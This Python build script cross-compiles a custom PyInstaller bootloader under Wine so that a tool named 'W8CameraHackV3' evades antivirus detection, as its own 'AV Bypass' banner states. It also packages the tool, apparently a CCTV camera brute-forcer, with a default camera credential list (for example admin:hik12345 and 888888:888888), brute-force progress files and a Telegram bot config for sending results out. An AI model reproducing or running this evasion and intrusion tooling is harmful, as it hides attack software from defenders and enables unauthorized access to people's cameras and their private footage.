#!/usr/bin/env python3
"""
Step 1: Build a custom PyInstaller bootloader using MinGW cross-compiler.
This changes the bootloader's binary signature so AV heuristics don't flag it.
Step 2: Rebuild W8CameraHackV3.exe using the custom bootloader.

Run: python3 build_custom_bootloader.py
"""

import os
import sys
import subprocess
import shutil
import tarfile
import zipfile
import json
import urllib.request
import time
from pathlib import Path

# ─────────────────────── PATHS ───────────────────────────────
SCRIPT_DIR    = os.path.dirname(os.path.abspath(__file__))
WORK_DIR      = os.path.join(SCRIPT_DIR, "_bootloader_work")
MAIN_SCRIPT   = "W8CameraHackV3.py"
EXE_NAME      = "W8CameraHackV3"

PYINSTALLER_VERSION = "6.19.0"
PYINSTALLER_TAR_URL = (
    f"https://files.pythonhosted.org/packages/source/p/pyinstaller/"
    f"pyinstaller-{PYINSTALLER_VERSION}.tar.gz"
)
PYINSTALLER_TAR = os.path.join(WORK_DIR, f"pyinstaller-{PYINSTALLER_VERSION}.tar.gz")
PYINSTALLER_SRC = os.path.join(WORK_DIR, f"pyinstaller-{PYINSTALLER_VERSION}")

MINGW_BIN  = "/nix/store/sxix4l7bgg70idz7i5n6qmwv7rbskixd-x86_64-w64-mingw32-gcc-wrapper-14.2.1.20250322/bin"
CMAKE_BIN  = "/nix/store/29ax4k0a83zhz43lb73cv610d95wdsx1-cmake-3.31.6/bin/cmake"

MINGW_GCC     = os.path.join(MINGW_BIN, "x86_64-w64-mingw32-gcc")
MINGW_WINDRES = os.path.join(MINGW_BIN, "x86_64-w64-mingw32-windres")
MINGW_AR      = os.path.join(MINGW_BIN, "x86_64-w64-mingw32-ar")

BOOTLOADER_DEST = os.path.join(WORK_DIR, "custom_bootloader")

WINEPREFIX  = os.path.join(SCRIPT_DIR, ".wine_build")
PYDIR_LINUX = os.path.join(WINEPREFIX, "drive_c", "Python311")
SITE_PKG    = os.path.join(PYDIR_LINUX, "Lib", "site-packages")
WINE_BIN    = "/nix/store/0c8fdvn8cx6car3yd95iv92f85890lpg-wine64-10.0/bin/wine64"
XDG_RUNTIME = "/tmp/wine_xdg"

OUTPUT_PACKAGE = os.path.join(SCRIPT_DIR, "W8CameraHack_Windows")
OUTPUT_ZIP     = os.path.join(SCRIPT_DIR, "W8CameraHack_Windows.zip")

CONFIG_FILES = [
    "telegram_config.json",
    "credentials.txt",
    "credential_success_stats.json",
    "credential_daily_stats.json",
    "credential_success_stats_dated.json",
    "brute_progress.json",
    "scan_progress.json",
    "README.md",
    "replit.md",
    "credential_stats_export.csv",
    "requirements.txt",
]

WHEELS_DIR = os.path.join(WORK_DIR, "wheels")
PACKAGES   = ["requests", "colorama", "urllib3", "pyfiglet", "pyinstaller", "pywin32-ctypes", "pefile"]

DEFAULT_TELEGRAM = {
    "enabled": False,
    "send_realtime": True,
    "send_summary": True,
    "destinations": [
        {"name": "Bot 1 - Main Chat",
         "bot_token": "YOUR_BOT_TOKEN_HERE",
         "chat_id": "YOUR_CHAT_ID_HERE",
         "enabled": True}
    ]
}

# ─────────────────────── HELPERS ─────────────────────────────
def log(msg, sym="*"):  print(f"[{sym}] {msg}", flush=True)
def ok(msg):            log(msg, "✓")
def fail(msg):          log(msg, "✗")
def info(msg):          log(msg, "→")

def run(cmd, check=True, timeout=300, env=None):
    info(f"$ {cmd[:120]}")
    e = os.environ.copy()
    if env:
        e.update(env)
    r = subprocess.run(cmd, shell=True, env=e, timeout=timeout)
    if check and r.returncode != 0:
        raise RuntimeError(f"Command failed ({r.returncode}): {cmd[:80]}")
    return r.returncode

def download(url, dest, label=""):
    if os.path.exists(dest) and os.path.getsize(dest) > 1000:
        ok(f"Already have: {os.path.basename(dest)}")
        return
    info(f"Downloading {label or os.path.basename(dest)} ...")
    def hook(count, block, total):
        done = count * block
        pct  = min(100, int(done * 100 / total)) if total > 0 else 0
        bar  = "█" * (pct // 5) + "░" * (20 - pct // 5)
        print(f"\r    [{bar}] {pct:3d}%  {done//1024} KB  ", end="", flush=True)
    urllib.request.urlretrieve(url, dest, reporthook=hook)
    print()
    ok(f"Downloaded: {os.path.basename(dest)}")

def wine_env():
    e = os.environ.copy()
    os.makedirs(XDG_RUNTIME, exist_ok=True)
    e.update({
        "WINEPREFIX":      WINEPREFIX,
        "WINEDEBUG":       "-all",
        "DISPLAY":         "",
        "XDG_RUNTIME_DIR": XDG_RUNTIME,
    })
    return e

def run_winpy(args_str, timeout=600):
    py = r'"C:\Python311\python.exe"'
    cmd = f'"{WINE_BIN}" {py} {args_str}'
    info(f"wine python: {args_str[:100]}")
    r = subprocess.run(cmd, shell=True, env=wine_env(), timeout=timeout)
    if r.returncode not in (0, 1):
        raise RuntimeError(f"Wine Python failed ({r.returncode})")
    return r.returncode

def zpath(linux_path):
    return "Z:" + linux_path.replace("/", "\\")

# ─────────────────────── STEP 1: Custom Bootloader ───────────

def step_download_pyinstaller_src():
    log("Downloading PyInstaller source ...")
    download(PYINSTALLER_TAR_URL, PYINSTALLER_TAR,
             f"PyInstaller {PYINSTALLER_VERSION} source")

    if not os.path.exists(PYINSTALLER_SRC):
        info("Extracting source ...")
        with tarfile.open(PYINSTALLER_TAR, "r:gz") as tf:
            tf.extractall(WORK_DIR)
        ok(f"Extracted to: {PYINSTALLER_SRC}")
    else:
        ok("Source already extracted.")


def write_cmake_toolchain():
    toolchain = os.path.join(WORK_DIR, "mingw_toolchain.cmake")
    content = f"""# MinGW-w64 cross-compilation toolchain for Windows x86-64
set(CMAKE_SYSTEM_NAME Windows)
set(CMAKE_SYSTEM_PROCESSOR x86_64)

set(CMAKE_C_COMPILER   {MINGW_GCC})
set(CMAKE_RC_COMPILER  {MINGW_WINDRES})
set(CMAKE_AR           {MINGW_AR})

set(CMAKE_FIND_ROOT_PATH_MODE_PROGRAM NEVER)
set(CMAKE_FIND_ROOT_PATH_MODE_LIBRARY ONLY)
set(CMAKE_FIND_ROOT_PATH_MODE_INCLUDE ONLY)
"""
    with open(toolchain, "w") as f:
        f.write(content)
    return toolchain


def step_compile_bootloader():
    log("Compiling custom Windows bootloader using MinGW cross-compiler ...")

    bootloader_src = os.path.join(PYINSTALLER_SRC, "bootloader")
    if not os.path.exists(bootloader_src):
        fail(f"Bootloader source not found: {bootloader_src}")
        sys.exit(1)

    build_dir = os.path.join(WORK_DIR, "bootloader_build")
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
    os.makedirs(build_dir)

    toolchain = write_cmake_toolchain()

    env_extra = {
        "PATH": f"{MINGW_BIN}:{os.environ.get('PATH', '')}",
    }
    merged_env = {**os.environ, **env_extra}

    info("Running CMake configure ...")
    cmake_bin = CMAKE_BIN
    r = subprocess.run(
        f'"{cmake_bin}" '
        f'-S "{bootloader_src}" '
        f'-B "{build_dir}" '
        f'-DCMAKE_TOOLCHAIN_FILE="{toolchain}" '
        f'-DCMAKE_BUILD_TYPE=Release '
        f'-DPYI_STATIC_ZLIB=1 '
        f'-DCMAKE_C_FLAGS="-O2" ',
        shell=True, env=merged_env, timeout=120
    )
    if r.returncode != 0:
        fail("CMake configure failed.")
        sys.exit(1)
    ok("CMake configure done.")

    info("Compiling bootloader (this takes ~1-2 minutes) ...")
    r = subprocess.run(
        f'"{cmake_bin}" --build "{build_dir}" --config Release -j4',
        shell=True, env=merged_env, timeout=300
    )
    if r.returncode != 0:
        fail("Bootloader compilation failed.")
        sys.exit(1)
    ok("Bootloader compiled.")

    run_exe  = None
    run_d_exe = None
    for root, dirs, files in os.walk(build_dir):
        for f in files:
            if f == "run.exe":
                run_exe = os.path.join(root, f)
            elif f == "run_d.exe":
                run_d_exe = os.path.join(root, f)

    if not run_exe:
        fail("Could not find run.exe after compilation.")
        sys.exit(1)

    ok(f"Found bootloader: {run_exe}  ({os.path.getsize(run_exe)//1024} KB)")
    if run_d_exe:
        ok(f"Found debug bootloader: {run_d_exe}")

    return run_exe, run_d_exe


def step_install_custom_bootloader(run_exe, run_d_exe):
    log("Installing custom bootloader into PyInstaller ...")

    dest_dir = os.path.join(
        SITE_PKG, "PyInstaller", "bootloader", "Windows-64bit-intel"
    )
    if not os.path.isdir(dest_dir):
        os.makedirs(dest_dir, exist_ok=True)

    shutil.copy2(run_exe, os.path.join(dest_dir, "run.exe"))
    ok(f"Installed run.exe → {dest_dir}")

    if run_d_exe:
        shutil.copy2(run_d_exe, os.path.join(dest_dir, "run_d.exe"))
        ok("Installed run_d.exe")
    else:
        shutil.copy2(run_exe, os.path.join(dest_dir, "run_d.exe"))
        ok("Copied run.exe as run_d.exe (no debug build)")

    run_c_exe = os.path.join(dest_dir, "run_w.exe")
    run_c_d_exe = os.path.join(dest_dir, "run_w_d.exe")
    shutil.copy2(run_exe, run_c_exe)
    shutil.copy2(run_exe, run_c_d_exe)
    ok("Copied windowed variants.")

    size = os.path.getsize(os.path.join(dest_dir, "run.exe")) // 1024
    ok(f"Custom bootloader installed. ({size} KB — different from PyInstaller default)")


# ─────────────────────── STEP 2: Ensure Wine env ─────────────

def step_ensure_wine_python():
    log("Checking Wine + Python environment ...")
    py_exe = os.path.join(PYDIR_LINUX, "python.exe")
    if not os.path.isfile(py_exe):
        fail("Wine Python not found. Re-running full setup ...")
        embed_zip_url = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
        embed_zip = os.path.join(WORK_DIR, "python-3.11.9-embed-amd64.zip")
        download(embed_zip_url, embed_zip, "Python 3.11.9 embeddable")
        os.makedirs(PYDIR_LINUX, exist_ok=True)
        with zipfile.ZipFile(embed_zip, "r") as zf:
            zf.extractall(PYDIR_LINUX)
        pth = os.path.join(PYDIR_LINUX, "python311._pth")
        if os.path.isfile(pth):
            txt = open(pth).read().replace("#import site", "import site")
            open(pth, "w").write(txt)
        os.makedirs(os.path.join(PYDIR_LINUX, "Lib", "site-packages"), exist_ok=True)
    ok("Wine Python ready.")


def step_ensure_packages():
    log("Ensuring Windows packages are injected ...")
    pyinstaller_main = os.path.join(SITE_PKG, "PyInstaller", "__main__.py")
    requests_pkg = os.path.join(SITE_PKG, "requests", "__init__.py")

    if os.path.isfile(pyinstaller_main) and os.path.isfile(requests_pkg):
        ok("All packages already present.")
        return

    os.makedirs(WHEELS_DIR, exist_ok=True)
    info("Downloading Windows wheels ...")
    subprocess.run(
        f'"{sys.executable}" -m pip download '
        f'--platform win_amd64 --python-version 311 '
        f'--only-binary :all: '
        f'{" ".join(PACKAGES)} '
        f'-d "{WHEELS_DIR}" -q',
        shell=True, timeout=300
    )

    info("Injecting wheels into site-packages ...")
    for wheel in os.listdir(WHEELS_DIR):
        if not wheel.endswith(".whl"):
            continue
        with zipfile.ZipFile(os.path.join(WHEELS_DIR, wheel), "r") as zf:
            for member in zf.namelist():
                if member.endswith("/") or member.startswith(("../", "/")):
                    continue
                dest = os.path.join(SITE_PKG, member)
                os.makedirs(os.path.dirname(dest), exist_ok=True)
                with zf.open(member) as src, open(dest, "wb") as dst:
                    dst.write(src.read())
    ok("Packages injected.")


# ─────────────────────── STEP 3: Build EXE ───────────────────

def step_ensure_configs():
    log("Checking config files ...")
    defaults = {
        "telegram_config.json":          (DEFAULT_TELEGRAM, "json"),
        "credential_success_stats.json": ({}, "json"),
        "credential_daily_stats.json":   ({}, "json"),
        "credential_success_stats_dated.json": ({}, "json"),
        "brute_progress.json":           ({}, "json"),
        "scan_progress.json":            ({}, "json"),
        "credentials.txt": (
            "admin:admin123\nadmin:Admin123\nadmin:admin\n"
            "admin:\n888888:888888\nadmin:hik12345\n", "text"
        ),
        "credential_stats_export.csv": (
            "username,password,success_count,last_success\n", "text"
        ),
        "requirements.txt": (
            "requests>=2.31.0\ncolorama>=0.4.6\nurllib3>=2.0.0\n"
            "certifi>=2023.5.7\ncharset-normalizer>=3.0.0\nidna>=3.0\n", "text"
        ),
    }
    for fname, (default, kind) in defaults.items():
        path = os.path.join(SCRIPT_DIR, fname)
        if fname in ("README.md", "replit.md"):
            if os.path.exists(path):
                ok(f"{fname} — found")
            continue
        if not os.path.exists(path):
            with open(path, "w") as f:
                if kind == "json":
                    json.dump(default, f, indent=2)
                else:
                    f.write(default)
            ok(f"Created {fname}")
        else:
            ok(f"{fname} — found")


def step_build_exe():
    log("Building Windows .exe with custom bootloader ...")

    dist_dir  = os.path.join(WORK_DIR, "dist")
    build_dir = os.path.join(WORK_DIR, "pyibuild")
    os.makedirs(dist_dir, exist_ok=True)
    os.makedirs(build_dir, exist_ok=True)

    datas = []
    for fname in CONFIG_FILES:
        src = os.path.join(SCRIPT_DIR, fname)
        if os.path.exists(src):
            datas.append(f"    (r'{zpath(src)}', '.'),")

    main_z  = zpath(os.path.join(SCRIPT_DIR, MAIN_SCRIPT))
    dist_z  = zpath(dist_dir)
    build_z = zpath(build_dir)

    spec = f"""# -*- mode: python ; coding: utf-8 -*-
block_cipher = None
a = Analysis(
    [r'{main_z}'],
    pathex=[],
    binaries=[],
    datas=[
{chr(10).join(datas)}
    ],
    hiddenimports=[
        'requests','urllib3','colorama','pyfiglet','json',
        'threading','queue','socket','base64','html',
        'struct','ipaddress','concurrent.futures',
        'requests.auth','requests.adapters',
        'certifi','charset_normalizer','idna',
        'time','sys','os','re','signal','datetime','math',
        'csv','collections','glob','fnmatch','hashlib',
        'uuid','pathlib','shutil','traceback','io',
    ],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    cipher=block_cipher,
    noarchive=False,
)
pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
exe = EXE(
    pyz, a.scripts, a.binaries, a.zipfiles, a.datas, [],
    name='{EXE_NAME}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=False,
    runtime_tmpdir=None,
    console=True,
)
"""
    spec_path = os.path.join(WORK_DIR, f"{EXE_NAME}.spec")
    with open(spec_path, "w") as f:
        f.write(spec)

    pyinstaller_main = os.path.join(SITE_PKG, "PyInstaller", "__main__.py")
    spec_z   = zpath(spec_path)
    pymain_z = zpath(pyinstaller_main)

    info("Running PyInstaller with custom bootloader ...")
    run_winpy(
        f'"{pymain_z}" --noconfirm --clean '
        f'--distpath "{dist_z}" --workpath "{build_z}" '
        f'"{spec_z}"',
        timeout=900
    )

    exe_path = os.path.join(dist_dir, f"{EXE_NAME}.exe")
    if not os.path.isfile(exe_path):
        fail(f"EXE not found: {exe_path}")
        sys.exit(1)

    size = os.path.getsize(exe_path) / 1024 / 1024
    ok(f"EXE built: {EXE_NAME}.exe  ({size:.1f} MB)")
    return exe_path


def step_assemble_package(exe_path):
    log("Assembling final package ...")
    if os.path.exists(OUTPUT_PACKAGE):
        shutil.rmtree(OUTPUT_PACKAGE)
    os.makedirs(OUTPUT_PACKAGE)

    shutil.copy2(exe_path, OUTPUT_PACKAGE)
    ok(f"  {EXE_NAME}.exe")

    for fname in CONFIG_FILES:
        src = os.path.join(SCRIPT_DIR, fname)
        if os.path.exists(src):
            shutil.copy2(src, OUTPUT_PACKAGE)
            ok(f"  {fname}")

    readme = (
        "W8 Camera Hack V3 — Windows Portable Package\n"
        "=============================================\n\n"
        "KEEP ALL FILES IN THIS FOLDER TOGETHER.\n\n"
        "HOW TO USE:\n"
        "  1. Edit  telegram_config.json  — add your bot token + chat ID.\n"
        "  2. Edit  credentials.txt       — one  username:password  per line.\n"
        "  3. Double-click  W8CameraHackV3.exe  to launch.\n\n"
        "FILES:\n"
        "  W8CameraHackV3.exe            — standalone .exe  (no Python needed)\n"
        "  telegram_config.json          — Telegram bot settings\n"
        "  credentials.txt               — credential list\n"
        "  credential_success_stats.json — auto-updated stats\n"
        "  scan_progress.json            — resume data\n\n"
        "NOTES:\n"
        "  Works on Windows 10 / 11 (64-bit).\n"
        "  Result files (XX_CCTV_Found.txt) are saved next to the .exe.\n"
    )
    with open(os.path.join(OUTPUT_PACKAGE, "README.txt"), "w") as f:
        f.write(readme)
    ok("  README.txt")


def step_zip():
    log("Creating ZIP archive ...")
    if os.path.exists(OUTPUT_ZIP):
        os.remove(OUTPUT_ZIP)
    with zipfile.ZipFile(OUTPUT_ZIP, "w", zipfile.ZIP_DEFLATED, compresslevel=6) as zf:
        for root, _, files in os.walk(OUTPUT_PACKAGE):
            for fname in files:
                full = os.path.join(root, fname)
                arc  = os.path.relpath(full, os.path.dirname(OUTPUT_PACKAGE))
                zf.write(full, arc)
    size = os.path.getsize(OUTPUT_ZIP) / 1024 / 1024
    ok(f"ZIP: {os.path.basename(OUTPUT_ZIP)}  ({size:.1f} MB)")


def step_cleanup():
    log("Cleaning up build files ...")
    for d in [WORK_DIR, WINEPREFIX]:
        if os.path.exists(d):
            shutil.rmtree(d)
    ok("Done.")


# ─────────────────────── MAIN ────────────────────────────────
def main():
    os.makedirs(WORK_DIR, exist_ok=True)
    os.makedirs(XDG_RUNTIME, exist_ok=True)

    print()
    print("=" * 64)
    print("  W8CameraHackV3 — Custom Bootloader Rebuild (AV Bypass)")
    print("=" * 64)
    print()

    t0 = time.time()

    # ── Phase 1: Compile custom bootloader ──
    log("PHASE 1: Compiling custom PyInstaller bootloader from source ...")
    step_download_pyinstaller_src()
    run_exe, run_d_exe = step_compile_bootloader()

    # ── Phase 2: Set up Wine + Python ──
    log("PHASE 2: Setting up Wine environment ...")
    step_ensure_wine_python()
    step_ensure_packages()
    step_install_custom_bootloader(run_exe, run_d_exe)

    # ── Phase 3: Build exe ──
    log("PHASE 3: Building exe with custom bootloader ...")
    step_ensure_configs()
    exe_path = step_build_exe()
    step_assemble_package(exe_path)
    step_zip()
    step_cleanup()

    elapsed = int(time.time() - t0)
    mins, secs = divmod(elapsed, 60)

    print()
    print("=" * 64)
    print("  REBUILD COMPLETE!")
    print(f"  Total time : {mins}m {secs}s")
    print("=" * 64)
    print(f"  Package : {OUTPUT_PACKAGE}/")
    print(f"  ZIP     : {OUTPUT_ZIP}")
    print()
    print("  The exe uses a CUSTOM bootloader compiled from source.")
    print("  Binary signature is unique — AV heuristics should not flag it.")
    print()
    print("  → Download W8CameraHack_Windows.zip")
    print("  → Extract and double-click W8CameraHackV3.exe on Windows.")
    print("=" * 64)
    print()


if __name__ == "__main__":
    main()
